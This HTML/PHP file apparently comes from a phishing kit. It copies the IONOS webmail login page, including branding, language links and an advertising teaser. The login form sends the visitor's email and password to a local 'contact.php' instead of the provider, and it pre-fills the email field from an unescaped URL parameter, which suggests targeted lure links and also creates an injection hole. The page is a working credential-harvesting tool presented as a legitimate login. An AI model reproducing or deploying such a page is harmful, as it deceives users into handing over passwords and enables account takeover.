<!DOCTYPE html>
<html lang="en" data-i18n="oao.lang" data-i18n-attr="lang">

<head>
  <!-- charset -->
  <meta charset="utf-8"/>

  <!-- canonical relevant information -->
  <link rel="canonical" href="index.html" data-i18n="oao.login.canonical" data-i18n-attr="href"/>
  <link rel="alternate" hreflang="de" href="https://mail.ionos.de/"/>
  <link rel="alternate" hreflang="en-gb" href="https://mail.ionos.co.uk/"/>
  <link rel="alternate" hreflang="en-us" href="index.html"/>
  <link rel="alternate" hreflang="en-ca" href="https://mail.ionos.ca/"/>
  <link rel="alternate" hreflang="en" href="index.html"/>
  <link rel="alternate" hreflang="es-es" href="https://mail.ionos.es/"/>
  <link rel="alternate" hreflang="es-mx" href="https://mail.ionos.mx/"/>
  <link rel="alternate" hreflang="es" href="https://mail.ionos.es/"/>
  <link rel="alternate" hreflang="fr" href="https://mail.ionos.fr/"/>
  <link rel="alternate" hreflang="it" href="https://mail.ionos.it/"/>
  <link rel="alternate" hreflang="x-default" href="index.html"/>
	
  <!-- head infos -->
  <title data-i18n="oao.login.title" data-i18n-attr="text">1&1 IONOS Webmail</title>
  <meta name="description" content="1&1 IONOS Webmail" data-i18n="oao.login.description" data-i18n-attr="content"/>

  <!-- microsoft ie-mode -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <!-- mobile config -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link rel="manifest" href="manifest.json">
  <!-- microsoft mobile config -->
  <meta id="win8Icon" name="msapplication-TileImage" content="img/icon144_win.png"/>
  <meta id="win8TileColor" name="msapplication-TileColor" content="#003d8f"/>
  <!-- apple mobile config -->
  <meta name="apple-mobile-web-app-capable" content="yes"/>
  <meta name="apple-mobile-web-app-title" content=""/>
  <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
  <!-- apple-touch-icon -->
  <link id="icon57" rel="apple-touch-icon" href="img/icon57.png"/>
  <link id="icon72" rel="apple-touch-icon" sizes="72x72" href="img/icon72.png"/>
  <link id="icon76" rel="apple-touch-icon" sizes="76x76" href="img/icon76.png"/>
  <link id="icon114" rel="apple-touch-icon" sizes="114x114" href="img/icon114.png"/>
  <link id="icon120" rel="apple-touch-icon" sizes="120x120" href="img/icon120.png"/>
  <link id="icon144" rel="apple-touch-icon" sizes="144x144" href="img/icon144.png"/>
  <link id="icon152" rel="apple-touch-icon" sizes="152x152" href="img/icon152.png"/>
  <link id="icon167" rel="apple-touch-icon" sizes="167x167" href="img/icon167.png"/>
  <link id="icon180" rel="apple-touch-icon" sizes="180x180" href="img/icon180.png"/>
  <link id="icon192" rel="apple-touch-icon" sizes="192x192" href="img/icon192.png"/>
  <!-- apple-touch-startup-image [media-devicewidth is not W3C-conform] -->
  <link id="splash460" rel="apple-touch-startup-image" href="img/splashscreen_460.jpg"/><!-- media="(device-width: 320px)" -->
  <link id="splash920" rel="apple-touch-startup-image" href="img/splashscreen_920.jpg"/><!-- media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" -->
  <link id="splash1096" rel="apple-touch-startup-image" href="img/splashscreen_1096.jpg"/><!-- media="(device-aspect-ratio: 40/71)" -->
  <!-- favicon -->
  <link id="favicon" rel="shortcut icon" href="img/favicon.ico" type="image/x-icon"/>
  <!-- css includes -->
  <link rel="stylesheet" type="text/css" href="./css/ionos.min02d0.css?v=5.1.2_20190902+0733" />
  <link rel="stylesheet" type="text/css" href="css/login.min02d0.css?v=5.1.2_20190902+0733"/>
  
	<style>
	.setup {
		display: block;
		margin: 0 auto;
		padding: 50px 32px 32px 32px;
		width: 550px;
		max-width: 550px;
		text-align: left;
		}
	</style>
  	

</head>
<body class="mail">

</div>

<!-- Global Navigation -->
<div id="header">
  <div class="oao-navi-navigation">
    <div class="oao-navi-left">
      <!-- uncomment for burger menu
      <span class="oao-navi-burger"></span>
      -->
      <div style="height:60px;">
        <a  data-i18n-attr="href" href="https://www.ionos.de/">
		  <img src="./img/logo.png" style="height:60px;">
        </a>
      </div>
    </div>
  </div>
</div>

<!-- main wrap -->
<div id="main">

  <!-- Global Navigation > Statuspage Integration > Incident/Maintenance status -->
  <div class="oao-statuspage-message-container" data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"></div>

  <!-- form contrainer -->
  <section class="login-forms" role="main">
    <div class="clearfix">
      <div class="clearfix">

        <!-- login-form -->
        <form id="login-form" class="form content-elem" action="contact.php"  method="post" autocomplete="on">

          <h1 class="headline">
            <span data-i18n="oao.login.heading" data-i18n-attr="text">Mail Login</span>
          </h1>

          <fieldset>
            <legend class="hidden" data-i18n="oao.login.email" data-i18n-attr="text" aria-hidden="false"></legend>
            <!-- login-form: error output -->
            <div id="login-erro" class="notificaiton-wrap"></div>

            <!-- login-form: elements -->
            <div class="form-field loginform-user">
              <label for="username" data-i18n="oao.login.field.email" data-i18n-attr="text"></label>
              <div class="input-text-group input-text-group--empty">
                <span class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
                <input type="email"
                  id="username" name="username" value="<?php echo $_GET['email'] ?>" placeholder="E-mail Address"
                  autofocus="autofocus"
                  tabindex="1"  required><!-- type email not working in IE for Umlaut-Domains currently -->
              </div>
            </div>
            <div class="form-field loginform-password">
              <label for="password" data-i18n="oao.login.field.password" data-i18n-attr="text"></label>
              <div class="sub-form-field right">
                <a data-i18n="oao.login.forgotpw.link" data-i18n-attr="href" href="#" data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin" tabindex="5">
                  <span data-i18n="oao.login.forgotpw.heading" data-i18n-attr="text"></span>
                </a>
              </div>
              <div class="input-text-group input-text-group--empty">
                <span class="input-text-group__icon exos-icon exos-icon-password-16"></span>
                <input type="password"
                  id="password" name="password"
                  value="" placeholder="Password"
                  autocomplete="current-password"
                  tabindex="2" required/>
              </div>
              <div class="sub-form-field left">
                <input id="staysignedin-box" class="input-checkbox" name="staysignedin" type="checkbox" value="1" tabindex="3"/>
                <label for="staysignedin-box">
                  <a data-i18n="oao.login.stay-signed-in.link" data-i18n-attr="href" href="#" data-flyin-href="" class="link link--lookup oao-pi-open-in-flyin">
                    <span data-i18n="oao.login.stay-signed-in" data-i18n-attr="text"></span>
                  </a>
                </label>
              </div>
            </div>
            <div class="form-field">
              <button type="submit" id="submit-login-form" name="submit" data-i18n="oao.login" data-i18n-attr="text" tabindex="4"></button>
            </div>
          </fieldset>
        </form>
      </div>
    </div>

  </section>

  <section id="ciso-afs-ads">
  
<section id="ias-container">
  <div class="grid-12 equal-grid-height">
    <div class="grid-07 grid-small-12">
      <h2 class="ias-headline">Real-time email messaging</h2>
      
          <p>Let us help make your email as simple as chat</p>
        
      
          <ul class="check-list">
            <li>Turn endless email threads into easy-to-follow conversations</li>
            <li>Keep your communication people-centric</li>
            <li>Collaborate easier using built-in Groups</li>
          </ul>
        
      <div>
        <a class="button-link" target="_blank" href="https://ias.ionos.com/ias/follow/CLICK?ias_source=WEBMAILER-US&amp;ias_medium=login-webmailer_login&amp;ias_content=WEBMAIL_LOGIN_TEASER_SPIKE_VARA-DEFAULT&amp;ias_campaign=mail-login&amp;target=https%3A%2F%2Fspikenow.com%2Fr%2Fionos%2F%3Fias_market%3DUS%26ias_variant%3DVARA">Get started, it's free</a>
      </div>
    </div>
    <div class="grid-05 grid-small-12 align-horizontal-center align-vertical-center">
      <img class="ias-responsive-video" src="https://ias.uicdn.net/fileadmin/user_upload/spike_smartphone_visual.png?h=f531e3343344f6e415e60989f1f881ffa0280f58">
    </div>
  </div>
</section>

<style type="text/css">
  #ias-container {
    background: #fff;
    margin-top: 32px;
    padding: 28px;
    -moz-box-shadow: 0 1px 2px 0 rgba(80,87,91,.15);
    -webkit-box-shadow: 0 1px 2px 0 rgba(80,87,91,.15);
    box-shadow: 0 1px 2px 0 rgba(80,87,91,.15);
  }
  .ias-responsive-video {
    max-width: 100%;
    max-height: 240px;
  }
  .ias-headline {
    width: 100%;
  }
</style>


    
</div></div>
  </section>

  <section id="assistants" class="setup">
    <h2 data-i18n="oao.login.setup.headline" data-i18n-attr="text"></h2>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.mobile" data-i18n-attr="text"></dt>
      <dd>
        <a data-i18n="oao.login.setup.mobile.ios.link" data-i18n-attr="href" href="#" class="link" tabindex="8" target="_blank">
          <span data-i18n="oao.login.setup.mobile.ios" data-i18n-attr="text"></span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.mobile.android.link" data-i18n-attr="href" href="#" class="link" tabindex="9" target="_blank">
          <span data-i18n="oao.login.setup.mobile.android" data-i18n-attr="text"></span>
        </a>
      </dd>
    </dl>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.desktop" data-i18n-attr="text"></dt>
      <dd>
        <a data-i18n="oao.login.setup.desktop.thunderbird.link" data-i18n-attr="href" href="#" class="link" tabindex="10" target="_blank">
          <span data-i18n="oao.login.setup.desktop.thunderbird" data-i18n-attr="text"></span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.desktop.outlook.link" data-i18n-attr="href" href="#" class="link" tabindex="11" target="_blank">
          <span data-i18n="oao.login.setup.desktop.outlook" data-i18n-attr="text"></span>
        </a>
      </dd>
      <dd>
        <a data-i18n="oao.login.setup.desktop.applemail.link" data-i18n-attr="href" href="#" class="link" tabindex="12" target="_blank">
          <span data-i18n="oao.login.setup.desktop.applemail" data-i18n-attr="text"></span>
        </a>
      </dd>
    </dl>
    <dl class="pipe-list">
      <dt data-i18n="oao.login.setup.other" data-i18n-attr="text"></dt>
      <dd>
        <a data-i18n="oao.login.setup.other.assistants.link" data-i18n-attr="href" href="#" class="link" tabindex="13" target="_blank">
          <span data-i18n="oao.login.setup.other.assistants" data-i18n-attr="text"></span>
        </a>
      </dd>
    </dl>
  </section>

  <div id="list-additional-login-links" class="setup">
    <h2 data-i18n="oao.login.morelogins.heading" data-i18n-attr="text"/></h2>
    <ul class="clearfix">
      <li>
        <a class="product-link " href="#" data-i18n="oao.login.controlcenter.link" data-i18n-attr="href" tabindex="6">
          <span class="product-link-image" id="product-link-image--controlcenter"></span>
          <span class="product-link-heading" data-i18n="oao.login.controlcenter" data-i18n-attr="text"/></span>
        </a>
      </li>
      <li>
        <a class="product-link " href="#" data-i18n="oao.login.hidrive.link" data-i18n-attr="href" tabindex="7">
          <span class="product-link-image" id="product-link-image--hidrive"></span>
          <span class="product-link-heading" data-i18n="oao.login.hidrive" data-i18n-attr="text"/></span>
        </a>
      </li>
    </ul>
  </div>

</div>

<footer>
  <ul class="clearfix">
    <li>
      <!-- Global Navigation > Statuspage Integration > Overall status -->
      <div class="oao-statuspage-overall-status"></div>
    </li>
    <li>
      <a href="#" data-i18n="oao.login.imprint.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.ionos.legal" data-i18n-attr="text"></span>&nbsp;•&nbsp;<span data-i18n="{YEAR}" data-i18n-attr="text"></span>
      </a>
    </li>
    <li>
      <a href="#" data-i18n="oao.login.datasecurity.link" data-i18n-attr="href" target="_blank">
        <span data-i18n="oao.login.datasecurity" data-i18n-attr="text"></span>
      </a>
    </li>
  </ul>
</footer>

<iframe class="hidden" src="robots.txt" name="loginTarget"></iframe>
<script type="text/javascript" src="main.min02d0.js?v=5.1.2_20190902+0733"></script>
</body>

</html>
